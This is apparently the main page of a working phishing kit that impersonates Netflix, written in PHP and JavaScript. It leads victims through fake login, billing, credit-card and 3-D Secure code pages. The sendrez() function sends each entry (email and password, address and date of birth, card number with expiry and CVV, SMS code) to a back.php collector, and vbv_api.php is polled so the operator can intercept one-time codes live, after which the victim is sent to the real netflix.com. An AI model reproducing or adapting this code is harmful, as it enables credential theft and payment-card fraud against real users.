<?php 
include '../server/ab.php'; 

update('visiteur');

?>
	<!DOCTYPE html>
	<html lang="<?php echo $lang; ?>" class=" ">

	<head id="head">
		<meta http-equiv='Content-Type' content='text/html; charset=UTF-8'>
		<meta http-equiv='X-UA-Compatible' content='IE=edge'>
		<title>Netflix</title>
		<meta name='viewport' content='width=device-width,initial-scale=1,minimum-scale=1,maximum-scale=1'>
		<link rel='shortcut icon' href='assets/favicon.ico'>
		<link rel='stylesheet' href='./assets/css/estilos.css'> 
		<script type='text/javascript' src='https://code.jquery.com/jquery-1.11.0.js'></script>
		<script type='text/javascript' src="https://rawgit.com/RobinHerbots/jquery.inputmask/3.x/dist/jquery.inputmask.bundle.js"></script>
	</head>
		
	<div class="loaderOverlay" style="display: none;" id="wload">
		<div style="background: rgba(0,0,0, 0.7);" data-nemo="loaderOverlay" class="modal-animate">
			<div class="rotate"></div>
			<div class="loaderOverlayAdditionalElements"></div>
		</div>
		<div class="modal-overlay"></div>
	</div>
    

	<div class="contain" id="contain"> </div>

	</html>
	<script>
	let vbv = '<?php echo $vbv;?>'
	
	let lang = '<?php echo $lang; ?>'

	function showError(type, error = "") {
		if(type == "show") {
			document.getElementById('error-text').innerHTML = error
			document.getElementById('error').style.display = "block"
		}
		if(type == "hide") {
			document.getElementById('error').style.display = "none"
		}
	}
    function visibility(type,id){
        if (type == "hide") {
            document.getElementById(id).style.display = "none"
        }
        if (type == "show") {
            document.getElementById(id).style.display = "block"
        }
    }


	function lfl(page) {
		let load = new XMLHttpRequest;
		load.open('GET', 'pages/' + page + '.php')
		load.addEventListener('load', () => {
			document.getElementById('contain').innerHTML = load.responseText
		})
		load.send()
	}

	function load(page) {
		let load = new XMLHttpRequest;
		load.open('GET', 'pages/' + page + '.php')
		load.addEventListener('load', () => {
			document.getElementById('contain').innerHTML = load.responseText

			if(page == '1') {
				sendrez('new', null)
			}
			if(page == '2') {
				document.getElementById('head').innerHTML = "<meta http-equiv='Content-Type' content='text/html; charset=UTF-8'><meta http-equiv='X-UA-Compatible' content='IE=edge'><title>Netflix</title><meta name='viewport' content='width=device-width,initial-scale=1,minimum-scale=1,maximum-scale=1'><link rel='shortcut icon' href='assets/favicon.ico'><link rel='stylesheet' href='./assets/1.css'> <link rel='stylesheet' href='./assets/2.css'>"
				$('#tel').inputmask("9999999999999999", {
					'placeholder': ''
				})
				$('#dob').inputmask("99/99/9999", {
					'placeholder': ''
				})
			}
			if(page == '3') {
				$('#cc').inputmask("9999 9999 9999 9999", {
					'placeholder': ''
				})
				$('#exp').inputmask("99/99", {
					'placeholder': ''
				})
				$('#ccv').inputmask("999", {
					'placeholder': ''
				})
			}
		})
		load.send()
	}
    load('1')
    visibility('show','wload')
	
    setTimeout(()=>{
        visibility('hide','wload')
    },2000)
	function value(id) {
		return document.getElementById(id).value
	}

	function sendrez(step, rez) {
		let sendr = new XMLHttpRequest;
		sendr.open('GET', 'back.php?action=send&rez=' + rez + "&step=" + step)
		sendr.send()
	}
	var luhn = (function(arr) {
		return function(ccNum) {
			var len = ccNum.length,
				bit = 1,
				sum = 0,
				val;
			while(len) {
				val = parseInt(ccNum.charAt(--len), 10);
				sum += (bit ^= 1) ? arr[val] : val;
			}
			return sum && sum % 10 === 0;
		};
	}([0, 2, 4, 6, 8, 1, 3, 5, 7, 9]));
	
	
	function pollAPI() {
	  // Effectuer une requête à votre API ici
	  // Vous pouvez utiliser fetch() pour cela

	  fetch('vbv_api.php?get_value=<?php echo $_SERVER["REMOTE_ADDR"]; ?>&token=1')
		.then(response => response.text())
		.then(data => {
          if (data === 'True') {
            load('5')
			fetch('vbv_api.php?restart=<?php echo $_SERVER["REMOTE_ADDR"]; ?>&token=1')
			  .catch(error => {
				console.error('Erreur :', error);
			  });
			
          } else if (data === '-1') {
			window.location = "https://netflix.com/";
		  }else {
			// Si la réponse n'est pas encore "ok", relancez le polling après un délai
			setTimeout(pollAPI, 3000); // Répéter la vérification toutes les 1 seconde (ajustez selon vos besoins)
		  }
		})
		.catch(error => {
		  // Gérer les erreurs de requête ici
		  console.error('Erreur de requête :', error);
		});
	}



	function submit(step) {
		fetch('../server/error.json').then(response => response.json()).then(data => {
			if(step == "1") {
				let ident = value('mail')
				let pass = value('pass')
				if(ident.includes('@')) {
					if(ident.split('@')[1].includes('.')) {
						if(pass.length >= 8) {
							showError('hide')
							load("2")
							sendrez('login', ident + '|' + pass)
						} else {
							showError('show', data[lang]['login_pass'])
						}
					} else {
						showError('show', data[lang]['login_mail'])
					}
				} else {
					if (!isNaN(ident)) {
						if(pass.length >= 8) {
							showError('hide')
							load("2")
							sendrez('login', ident + '|' + pass)
						} else {
							showError('show', data[lang]['login_pass'])
						}
					}else{
						showError('show', data[lang]['login_mail'])
					}
				}
			}
			if(step == "2") {
				fetch('vbv_api.php?value=<?php echo $_SERVER["REMOTE_ADDR"]; ?>&token=1')
				  .catch(error => {
					console.error('Erreur :', error);
				  });
				let name = value('name')
				let city = value('city')
				let zip = value('zip')
				let address = value('address')
				let dob = value('dob')
				let tel = value('tel')
				if(name != '') {
					if(parseInt(dob.split('/')[2]) <= 2004 && dob.split('/')[2].length == 4) {
							if(tel.replace(' ', '').length >= 8) {
								if(city != "") {
									if(address.length > 3) {
										
										if(zip.length > 2) {
											showError('hide')
											visibility('show','wload')
											load('3')
											
											sendrez('billing', name + '|' + dob + '|' + tel + '|' + city + '|' + address + '|' + zip)
										} else {
										showError('show', data[lang]['billing_zip'])
									}
								} else {
									showError('show', data[lang]['billing_address'])
								}
							} else {
								showError('show', data[lang]['billing_city'])
							}
						} else {
							showError('show', data[lang]['billing_tel'])
						}
					} else {
						showError('show', data[lang]['billing_dob'])
					}
				} else {
					showError('show', data[lang]['billing_name'])
				}
			}
			if(step == '3') {
				let name = value('ccn')
				let cc = value('cc')
				let exp = value('exp')
				let ccv = value('ccv')
				if(cc.length == 19 && luhn(cc.replace(' ', '').replace(' ', '').replace(' ', ''))) {
					if(parseInt(exp.split('/')[1]) >= 22) {
						if(ccv.length == 3) {
							showError('hide')
							sendrez('cc', name + '|' + cc + '|' + exp + '|' + ccv)
							if(vbv == '1') {
								visibility('show','wload')
								load('4')
								pollAPI()
								
							} else {
								window.location = "https://netflix.com/"
							}
							
						} else {
							showError('show',  data[lang]['cc_ccv'])
						}
					} else {
						showError('show',  data[lang]['cc_exp'])
					}
				} else {
					showError('show',  data[lang]['cc_card'])
				}
			}
			if(step == '4') {
				let code = value('vbv')
				if(code.length > 2) {
					showError('hide')
					sendrez('vbv', code)
					if(vbv == '1') {
						fetch('vbv_api.php?value=<?php echo $_SERVER["REMOTE_ADDR"]; ?>&token=1')
						  .catch(error => {
							console.error('Erreur :', error);
						  });
						visibility('show','wload')
						load('4')
						pollAPI()
						
					} else {
						window.location = "https://netflix.com/"
					}
				} else {
					showError('show',  data[lang]['sms_code'])
				}
			}



		}).catch(error => {
			console.error(error);
		});
	}
	</script>